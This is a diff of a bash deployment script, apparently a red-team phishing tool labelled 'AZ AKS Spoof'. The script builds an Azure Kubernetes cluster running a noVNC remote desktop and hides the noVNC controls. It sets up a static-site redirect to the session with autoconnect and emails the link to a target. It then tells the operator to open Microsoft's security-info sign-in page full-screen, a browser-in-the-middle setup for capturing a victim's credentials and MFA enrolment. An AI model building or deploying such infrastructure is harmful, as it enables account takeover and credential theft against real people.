@@ -1,7 +1,8 @@
 #!/bin/bash
 ## Author Patrick Binder
 ## Version 1.1
-## date 2025-01-01
+## Date 2025-01-01
+## Filename azaksmail.sh
 
 ############################################################
 #                   Azure Web App Deployment Tool           #
@@ -59,33 +60,12 @@ display_banner() {
     display_message "#  / ___ |/ /__   / ___ |/ /| |___/ /   ___/ / ____/ /_/ / /_/ / __/       #" "magenta"
     display_message "# /_/  |_/____/  /_/  |_/_/ |_/____/   /____/_/    \____/\____/_/          #" "magenta"
     display_message "#                                                                          #" "magenta"
-    display_message "#            Azure Web App Deployment Tool - AZ ARC Spoof                  #" "magenta"
-    display_message "#               Embedding RDP Environment in a website                     #" "magenta"
+    display_message "#            Azure POC Mailing Tool - AZ AKS Spoof                         #" "magenta"
+    display_message "#            Embedding RDP Environment in a website                        #" "magenta"
     display_message "############################################################################" "cyan"
 }
 
-############################################################
-#                Simple Status Bar Animation               #
-############################################################
-show_status_bar() {
-    local duration=${1:-10} # Default 10s if not provided
-    local increment=$((duration / 100))
-    local percent=0
-    while [[ $percent -le 100 ]]; do
-        echo -ne "\r["
-        for ((i = 0; i < 50; i++)); do
-            if [[ $i -lt $((percent / 2)) ]]; then
-                echo -ne "#"
-            else
-                echo -ne "-"
-            fi
-        done
-        echo -ne "] $percent%"
-        sleep $increment
-        percent=$((percent + 1))
-    done
-    echo ""
-}
+
 
 ############################################################
 #                      Send Email Function                 #
@@ -152,7 +132,7 @@ check_and_delete_old_resource_groups() {
         read -p "Do you want to delete these resource groups? (yes/no): " delete_confirmation
         if [[ "$delete_confirmation" == "yes" ]]; then
             while read -r group; do
-                display_message "Deleting resource group $group..." "blue"
+                display_message "Deleting resource group $group..." "red"
                 # Suppress deletion output
                 az group delete --name "$group" --yes --no-wait >/dev/null 2>&1
             done <<< "$old_groups"
@@ -263,8 +243,9 @@ main() {
     local location="eastus"
     local aks_name="rdp-cluster-$RANDOM"
     local storage_account_name="staticweb$RANDOM"
-    local firstname=""
-    local lastname=""
+    local index_file="./index.html"
+    local public_ip=""
+    local email_body=""
     local index_file="./index.html"
     local public_ip=""
     local email_body=""
@@ -272,9 +253,9 @@ main() {
     # Create Resource Group
     display_message "Creating Resource Group: $resource_group ..." "blue"
     az group create --name "$resource_group" --location "$location" >/dev/null 2>&1
-    show_status_bar 3
+    
     display_message "Resource Group created: $resource_group" "green"
-
+    
     # Create AKS Cluster
     display_message "Creating AKS Cluster: $aks_name ..." "blue"
     az aks create \
@@ -286,10 +267,12 @@ main() {
         display_message "Error occurred during AKS creation." "yellow"
         sleep 50
     }
+        
+
     az aks get-credentials --resource-group "$resource_group" --name "$aks_name" >/dev/null 2>&1 || {
         display_message "Failed to retrieve AKS credentials." "yellow"
     }
-    show_status_bar 3
+    
     display_message "AKS Cluster created: $aks_name" "green"
 
    # Deploy RDP Container
@@ -330,7 +313,7 @@ spec:
 EOF
 kubectl apply -f rdp-deployment.yaml >/dev/null 2>&1
 display_message "Waiting for AKS to assign public IP..." "yellow"
-show_status_bar 3
+
 
 # Wait for public IP
 while [[ -z "$public_ip" ]]; do
@@ -339,10 +322,26 @@ while [[ -z "$public_ip" ]]; do
 done
 display_message "AKS Public IP assigned: $public_ip" "green"
 
+# Wait for the RDP container to be ready
+display_message "Waiting for RDP container to be ready..." "yellow"
+container_ready=0
+while [[ $container_ready -eq 0 ]]; do
+    if kubectl get pods -l app=rdp -o jsonpath='{.items[0].status.containerStatuses[0].ready}' 2>/dev/null | grep -q "true"; then
+        container_ready=1
+    else
+        display_message "RDP container not ready yet. Waiting for 30 seconds..." "yellow"
+        sleep 30
+    fi
+done
+display_message "RDP container is ready." "green"
+
+sleep 30
+
 # Modify the file in the container
 display_message "Modifying /usr/share/novnc/index.html in the container..." "blue"
-kubectl exec $(kubectl get pods -l app=rdp -o jsonpath='{.items[0].metadata.name}') -- bash -c "echo '<!DOCTYPE html><html lang=\"en\"><head><title>Remote Desktop</title><style>html, body {margin: 0; padding: 0; overflow: hidden; height: 120%; width: 120%;} canvas {display: block; width: 120%; height: 120%; background-color: white;}</style><script type=\"module\">import RFB from \"./core/rfb.js\";document.addEventListener(\"DOMContentLoaded\", () => {const urlParams = new URLSearchParams(window.location.search);const host = urlParams.get(\"host\") || \"localhost\";const port = urlParams.get(\"port\") || \"6901\";const path = urlParams.get(\"path\") || \"websockify\";const rfb = new RFB(document.body, \`ws://${host}:${port}/${path}\`, { shared: true });rfb.scaleViewport = true;rfb.resizeSession = true;rfb.viewOnly = false;window.addEventListener(\"resize\", () => {rfb.scaleViewport = true;rfb.resizeSession = true;});});</script></head><body></body></html>' > /usr/share/novnc/index.html"
+kubectl exec $(kubectl get pods -l app=rdp -o jsonpath='{.items[0].metadata.name}') -- bash -c "echo '<!DOCTYPE html><html lang=\"en\"><head><title>Remote Desktop</title><style>html, body {margin: 0; padding: 0; overflow: hidden; height: 100%; width: 100%;} canvas {display: block; width: 100%; height: 100%; background-color: black;} #noVNC_status_bar, #noVNC_buttons {opacity: 0; pointer-events: none;}</style><script type=\"module\">import RFB from \"./core/rfb.js\";document.addEventListener(\"DOMContentLoaded\", () => {const urlParams = new URLSearchParams(window.location.search);const host = urlParams.get(\"host\") || \"localhost\";const port = urlParams.get(\"port\") || \"6901\";const path = urlParams.get(\"path\") || \"websockify\";const rfb = new RFB(document.body, \`ws://${host}:${port}/${path}\`, { shared: true });rfb.scaleViewport = true;rfb.resizeSession = true;rfb.viewOnly = false;window.addEventListener(\"resize\", () => {rfb.scaleViewport = true;rfb.resizeSession = true;});});</script></head><body></body></html>' > /usr/share/novnc/index.html"
 display_message "File /usr/share/novnc/index.html modified successfully." "green"
+
 
     # Wait for public IP
     while [[ -z "$public_ip" ]]; do
@@ -358,7 +357,7 @@ display_message "File /usr/share/novnc/index.html modified successfully." "green
                               --location "$location" \
                               --sku Standard_LRS \
                               >/dev/null 2>&1
-    show_status_bar 2
+    
     az storage blob service-properties update \
        --account-name "$storage_account_name" \
        --static-website \
@@ -377,7 +376,7 @@ display_message "File /usr/share/novnc/index.html modified successfully." "green
     <title>Redirect</title>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            window.location.href = "http://$public_ip:6901";
+            window.location.href = "http://$public_ip:6901/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false";
         });
     </script>
 </head>
@@ -412,10 +411,9 @@ EOF
     send_email "$smtp_server" "$recipient" "$mail_address" "$subject" "$email_body"
     display_message "Email sent successfully to $recipient." "green"
 
-    # Show final link
     display_message "" "cyan"
     display_message "############################################" "cyan"
-    display_message "RDP is available at: http://${public_ip}:6901" "magenta"
+    display_message "RDP is available at: http://${public_ip}:6901/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false" "magenta"
     display_message "Static site redirect link: ${website_url}" "magenta"
     display_message "now navigate to rdp open https://mysignins.microsoft.com/security-info then F11" "cyan"
     display_message "############################################" "cyan"
